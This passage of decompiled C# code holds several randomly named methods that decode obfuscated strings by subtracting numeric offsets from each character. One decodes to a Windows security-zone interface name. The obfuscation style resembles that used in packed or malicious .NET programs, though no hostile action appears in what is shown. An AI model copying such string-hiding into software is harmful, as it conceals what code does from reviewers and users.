ꧨꨙ꧹ꨔꨉ꧰ꨌ꧲\uA9FFꨑ꧷ꨘꨌꧭꨞꧨ꧹꧶ꧯꨗ꧴ꨋꨏꨞ꧶ꧪꨙꨁ꧹꧱ꧻꨐꨉꨚꨟꨉꧻꨜꧬꨒꨞꨠꨑꨝ꧹ꨡꨌ꧹ꨋꨝꨐꨟꧨꨟꨑ꧲꧷ꨔꨍ꧵꧲ꨍꧨꧾꨏꨊꨔꨀꨠ\uA9FFꨜꨕ꧲ꧪꧮ꧱\uA9FFꨈ\uA9FFꨋ";
      string str = "43431";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }

    public static string jYgGTnaIGBfogXkMqdZo()
    {
      string source = "烨烏烙烁烛烱烤烪烰烢烫烏烢烃烑炾烯烈烟烁炿烊烩烄烋烂烍烦烋烆烋烞热烛烁烌烬烀烑烃烍烜炸烩烌烢烈烅烤炸烩烉烤烙烀烜烂烏烡烇烨烜炽烮炸烉烆炿烧烄烛烟烮烆為烩烑烉烁烋烠烙烪烯烙烋烬炼烢烮烰烡热烉烱烜烉烛热烠烯炸烯烡烂烇烤烝烅烂烝炸烎烟烚烤烐烰烏烬烥烂為炾烁烏烘烏烛";
      string str = "28791";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }

    public static string euhFwTvVqcqkYnpXOBPZFrFbrFlX()
    {
      string source = "";
      string str = "2729";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }

    public static string JhULynRgPlGOmPNmybgbAlmfPQavCnj()
    {
      string source = "";
      string str = "16174";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }

    public static string PGcdBRJgHLEtRfPoegkQTMyVOWInvEBbH()
    {
      string source = "棛棛椀椆棷椄椀棷椆棥棷棵椇椄棻椆椋棟棳椀棳棹棷椄棎棁椂棐";
      string str = "26770";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }

    public static string iKiWkxVTzHLXKkhxhZhBd()
    {
      string source = "";
      string str = "28799";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }
  }
}
